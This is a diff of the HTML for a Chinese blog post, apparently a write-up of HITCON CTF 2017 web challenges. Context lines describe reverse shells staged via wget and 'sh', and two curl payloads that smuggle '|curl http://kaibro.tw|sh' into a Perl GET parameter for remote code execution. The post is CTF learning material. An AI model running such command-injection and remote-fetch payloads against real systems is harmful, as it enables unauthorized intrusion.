@@ -14,10 +14,12 @@
 <meta property="og:url" content="http://w181496.twbbs.org/2017/11/07/HITCON-CTF初賽/index.html">
 <meta property="og:site_name" content="Kaibro&#39;s blog">
 <meta property="og:description" content="我來打醬油的好像都沒貢獻到啥QQ 來記錄一下Web簡單題的解法和幾題賽中有碰，但沒解出來的QQ Baby First Revenge v1這題和隊友討論很久才搞定QQ其實一開始我們的方向就是正確的比賽剛開始就在想，利用&amp;gt;ls之類的寫檔再用ls&amp;gt;z，把產生的那些檔名塞到另一個檔案最後串成指令去sh z跑 但後來發現ls會有順序問題，難搞定思路就愈走愈偏了QQ">
-<meta property="og:updated_time" content="2017-11-07T14:42:00.000Z">
+<meta property="og:image" content="https://i.imgur.com/I7szGI7.png">
+<meta property="og:updated_time" content="2017-11-08T09:41:16.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HITCON CTF初賽">
 <meta name="twitter:description" content="我來打醬油的好像都沒貢獻到啥QQ 來記錄一下Web簡單題的解法和幾題賽中有碰，但沒解出來的QQ Baby First Revenge v1這題和隊友討論很久才搞定QQ其實一開始我們的方向就是正確的比賽剛開始就在想，利用&amp;gt;ls之類的寫檔再用ls&amp;gt;z，把產生的那些檔名塞到另一個檔案最後串成指令去sh z跑 但後來發現ls會有順序問題，難搞定思路就愈走愈偏了QQ">
+<meta name="twitter:image" content="https://i.imgur.com/I7szGI7.png">
   
     <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
   
@@ -73,7 +75,7 @@
 						<li>Tags</li>
 						
 						
-						<li>About</li>
+						<li>Über</li>
 						
 					</ul>
 				</div>
@@ -217,7 +219,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Flag is in the MySQL database</div><div class="line">fl4444g / SugZXUtgeJ52_Bvr</div></pre></td></tr></table></figure>
 <p>所以基本上就是要拿shell惹QQ</p>
 <p><br></p>
-<p>我後來是發現有<code>lsof</code>可以用<br>可以看其他人在幹啥XDDD<br>甚至也可以拿到別人的ip hash  (( 就是<code>md5(&#39;orange&#39;.ip);</code><br>這一招真的對我們幫助很大XD</p>
+<p>我後來是發現有<code>lsof</code>可以用<br>可以看其他人在幹啥XDDD<br>甚至也可以拿到別人的ip hash  (( 就是<code>md5(&#39;orange&#39;.ip);</code><br>這一招真的對我們幫助很大XD<br><img src="https://i.imgur.com/I7szGI7.png" alt=""></p>
 <p>因為我發現很多人卡著shell<br>就用他們的hash去看目錄下有啥<br>意外的大家目錄下都有<code>index.html</code></p>
 <p>然後內容都是reverse shell連線command<br>再看一下目錄下其他檔案<br>就大概能猜出<br>他們是用<code>wget</code>載他們server上的index.html<br>然後<code>sh i*</code>去reverse shell連回去</p>
 <p>想通這點，後面就很快了<br>就只要想辦法構造wget kaibro.tw之類的<br>這部分會蠻吃域名名稱的<br>如果域名是abcde.tw之類的會很難構造XD<br>隊友還因此買了一個x開頭的短域名<br>然後就秒構造一個payload拿到shell了</p>
@@ -251,7 +253,8 @@
 <h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>這題也是賽中沒解出來<br>第二天一直在搞這題<br>整個方向都想偏了<br>一直以為要像Discuz Pwn一樣打某個服務</p>
 <p>看了別人的write up<br>發現有人用一招很猥瑣的方式拿flag<br>類似這樣：<br><code>curl &#39;http://13.115.136.15/?url=a&amp;filename=|curl+http://kaibro.tw|sh&#39;</code><br><code>curl &#39;http://13.115.136.15/?url=file:|curl+http://kaibro.tw|sh&#39;</code></p>
 <p>就是perl的GET看到file會去open本地檔案<br>然後跟AIS3講的ruby open一樣<br>可以在後面塞 | 去執行指令 =&gt; RCE</p>
-<p>但是從source code可以看到，它會先去檢查檔案是否存在<br>例如<code>filename=|ls</code>會去建立<code>|ls</code>這個檔案<br>然後<code>url=file:|ls</code>就會執行ls惹<br>可以用|sleep+10之類的來測試一下，會卡個一下，說明有成功執行</p>
+<p>但是從source code可以看到，它會先去檢查檔案是否存在<br>所以必須先建立檔案</p>
+<p>例如<code>filename=|ls</code>會去建立<code>|ls</code>這個檔案<br>然後<code>url=file:|ls</code>就會執行ls惹<br>可以用|sleep+10之類的來測試一下，會卡個一下，說明有成功執行</p>
 <p>接著建立reverse shell，去跑/readflag就能拿flag惹<br><code>hitcon{Perl_&lt;3_y0u}</code></p>
 <p>真的沒想到這題能這樣解，覺得奇技淫巧</p>
 
